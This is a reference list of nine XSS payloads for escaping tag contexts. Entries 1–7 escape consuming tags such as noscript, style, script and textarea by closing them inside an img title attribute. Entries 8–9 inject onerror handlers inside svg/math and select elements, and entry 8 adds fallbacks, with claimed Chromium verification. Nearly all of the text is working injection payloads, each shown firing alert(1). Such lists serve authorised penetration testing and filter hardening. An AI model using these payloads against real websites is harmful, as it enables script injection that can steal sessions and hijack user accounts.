1. XSS with Noembed Consuming Tag
- Payload: <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <noembed> tag
- Case: The <noembed> tag consumes everything until </noembed>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>

---

2. XSS with Noscript Consuming Tag
- Payload: <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <noscript> tag
- Case: The <noscript> tag consumes everything until </noscript>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>

---

3. XSS with Style Consuming Tag
- Payload: <style><img title="</style><img src onerror=alert(1)>"></style>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <style> tag
- Case: The <style> tag consumes everything until </style>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <style><img title="</style><img src onerror=alert(1)>"></style>

---

4. XSS with Script Consuming Tag
- Payload: <script><img title="</script><img src onerror=alert(1)>"></script>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <script> tag
- Case: The <script> tag consumes everything until </script>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <script><img title="</script><img src onerror=alert(1)>"></script>

---

5. XSS with Iframe Consuming Tag
- Payload: <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside an <iframe> tag
- Case: The <iframe> tag consumes everything until </iframe>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>

---

6. XSS with Title Consuming Tag
- Payload: <title><img title="</title><img src onerror=alert(1)>"></title>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <title> tag
- Case: The <title> tag consumes everything until </title>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <title><img title="</title><img src onerror=alert(1)>"></title>

---

7. XSS with Textarea Consuming Tag
- Payload: <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <textarea> tag
- Case: The <textarea> tag consumes everything until </textarea>. Close the tag inside an attribute and inject an img tag with onerror
- Output: <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>

---

8. XSS Inside `<svg>` / `<math>` Foreign Content (NO closing tag needed)
- Payload: <img src=x onerror=alert(1)>
- Condition: Input reflected inside `<svg>` or `<math>` wrapper; angle brackets NOT encoded
- Case: HTML Standard §13.2.6.5 — a start tag from the breakout list (b, big, blockquote, body, br, center, code, dd, div, dl, dt, em, embed, h1–h6, head, hr, i, img, li, listing, menu, meta, nobr, ol, p, pre, ruby, s, small, span, strong, strike, sub, sup, table, tt, u, ul, var, and font[color|face|size]) pops the parser back to the HTML namespace. `<img src=x onerror=…>` therefore fires INSIDE `<svg>` without `</svg>` at all.
- Output: <svg><img src=x onerror=alert(1)></svg>
- Verified: Chromium data: URL — fires `1`
- Fallback: `<p><details open ontoggle=alert(1)>` (p is also a breakout tag), or classic `</svg><script>…</script>` / `</svg><img …>` closers when breakout tags are filtered.

9. XSS Inside `<select>` — NOT a consuming context (spec correction)
- Payload: <img src=x onerror=alert(1)>   (works verbatim inside the select)
- Condition: Input reflected inside `<select>` or even `<option>`; angle brackets NOT encoded
- Case: The old "in select" insertion mode that dropped non-option markup was REMOVED from the HTML Standard. In current engines markup inside `<select>`/`<option>` is inserted as ordinary DOM children — `<img>`, `<svg>`, `<script>`, `<details>`, `<video>` all fire without any closer. The only select-scoped rules left: `<input>` and nested `<select>` start tags pop the select and land OUTSIDE it (still firing), and `option`/`optgroup` get implied end tags. `</select>` + payload remains a valid fallback but is unnecessary in modern browsers.
- Verified in Chromium: `<select><img src=x onerror=alert(1)></select>` -> DOM keeps the img child and fires `1`; `<select><option><img …>` fires too.

